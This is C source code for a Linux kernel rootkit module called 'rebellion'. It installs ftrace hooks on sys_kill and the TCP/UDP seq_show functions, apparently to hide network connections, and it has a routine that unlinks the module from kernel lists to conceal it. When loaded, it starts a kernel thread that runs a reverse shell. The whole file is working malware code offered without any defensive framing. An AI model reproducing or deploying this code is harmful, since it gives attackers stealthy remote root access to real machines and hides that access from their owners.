#include "config.h"
#include "hooks/kill.h"
#include "hooks/tcpX_seq_show.h"
#include "hooks/udpX_seq_show.h"
#include "hooks/icmp_rcv.h"

#ifdef __x86_64__
#define SYSTEM_ARCH(s) "__x64_" s
#else
#define SYSTEM_ARCH(s) s
#endif

static struct ftrace_hook hooks[] = {
    HOOK(SYSTEM_ARCH("sys_kill"), kill_hook, &original_kill),
    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &original_tcp4_seq_show),
    HOOK("tcp6_seq_show", tcp6_seq_show_hook, &original_tcp6_seq_show),
    HOOK("udp4_seq_show", udp4_seq_show_hook, &original_udp4_seq_show),
    HOOK("udp6_seq_show", udp6_seq_show_hook, &original_udp6_seq_show)
    // HOOK("icmp_rcv", icmp_rcv_hook, &original_icmp_rcv), // Removed - using automatic execution instead
};

void hideModule(void) {
	if (isModuleHidden == TRUE) {
        return;
    }

	modPrevious = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	modKOBJPrevious = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	isModuleHidden = TRUE;
}
 
void showModule(void) {
	int result;

	if (isModuleHidden == FALSE) {
        return;
    }

	list_add(&THIS_MODULE->list, modPrevious);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULENAME);
	isModuleHidden = FALSE;
}


static int __init rebellion_init(void) {
    revshell_thread = kthread_run(revshell_func, NULL, "shell_thread");
    if (IS_ERR(revshell_thread)) {
        return PTR_ERR(revshell_thread);
    }

    int err; 
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit rebellion_exit(void) {
    if (revshell_thread) {
        kthread_stop(revshell_thread);
    }
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rebellion_init);
module_exit(rebellion_exit);
